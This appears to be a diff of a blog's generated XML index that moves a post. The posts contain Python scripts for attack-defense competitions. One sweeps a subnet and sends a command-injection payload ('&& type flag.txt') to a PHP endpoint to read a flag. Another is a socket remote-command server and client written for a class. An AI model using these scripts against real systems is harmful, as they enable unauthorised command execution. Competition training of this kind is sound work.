@@ -545,6 +545,31 @@
     
     
     <entry>
+      <title>【PythonScript】:WebShell_urilb</title>
+      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/"/>
+      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/</url>
+      
+        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p><strong>使用urlilb模块</strong></p><p><strong>在一些特定的攻防比赛中，攻击机没有安装requests模块，只能使用urlilb模块来代替</strong></p><a id="more"></a><pre><code class="language-Python">import urllib.parseimport urllib.requestimport threadingdef WebShell(i):    data = {&quot;dir&quot;: &quot;&amp;&amp; type flag.txt&quot;}    url = &quot;http://192.168.123.&quot;+str(i)+&quot;/DirCtrl.php&quot;    data_string=urllib.parse.urlencode(data)    new_url=url+&quot;?&quot;+data_string    try:        send = urllib.request.urlopen(new_url,timeout=1)        print(send.read().decode(&quot;utf8&quot;,&quot;ignore&quot;))    except:        passfor i in range(1,255):    t = threading.Thread(target=WebShell, args=(i, ))    t.start()</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Python </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Python </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>【PythonScript】:Web_Dirs_Scnnaer</title>
       <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWeb_Dirs_Scanner/"/>
       <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWeb_Dirs_Scanner/</url>
@@ -575,31 +600,6 @@
       <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACsocket_cmd%E8%BF%9E%E6%8E%A5/</url>
       
         <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>为了给学弟上公开课刻意写了一个远控脚本，虽然不这么行xD</p><a id="more"></a><ul><li><strong>Server:</strong></li></ul><pre><code class="language-Python">import socket,osdef main():    global data, s    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.bind(('127.0.0.1',10001))    s.listen(5)    print(&quot;等待连接中……&quot;)    while True:        conn,addr = s.accept()        while True:            print('收到命令')            data = conn.recv(1024)            cmd = os.popen(data.decode())            os_result = cmd.read()            conn.sendall(os_result.encode('utf8'))if __name__ == '__main__':    main()</code></pre><ul><li><strong>Client:</strong></li></ul><pre><code class="language-Python">import  socketServerIP=('127.0.0.1',10001)try:    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)    s.connect(ServerIP)    print('[+]连接成功')except:    print('[-]服务器无响应')    exit(0)while True:    data=input('[CMD]&gt;&gt;')    s.sendto(bytes(data,encoding='utf8'),ServerIP)    data = s.recv(1024)    print('[+]回显成功')    print(data.decode())</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> Python </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Python </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>【PythonScript】:WebShell_urilb</title>
-      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/"/>
-      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/</url>
-      
-        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p><strong>使用urlilb模块</strong></p><p><strong>在一些特定的攻防比赛中，攻击机没有安装requests模块，只能使用urlilb模块来代替</strong></p><a id="more"></a><pre><code class="language-Python">import urllib.parseimport urllib.requestimport threadingdef WebShell(i):    data = {&quot;dir&quot;: &quot;&amp;&amp; type flag.txt&quot;}    url = &quot;http://192.168.123.&quot;+str(i)+&quot;/DirCtrl.php&quot;    data_string=urllib.parse.urlencode(data)    new_url=url+&quot;?&quot;+data_string    try:        send = urllib.request.urlopen(new_url,timeout=1)        print(send.read().decode(&quot;utf8&quot;,&quot;ignore&quot;))    except:        passfor i in range(1,255):    t = threading.Thread(target=WebShell, args=(i, ))    t.start()</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
       
       
       <categories>
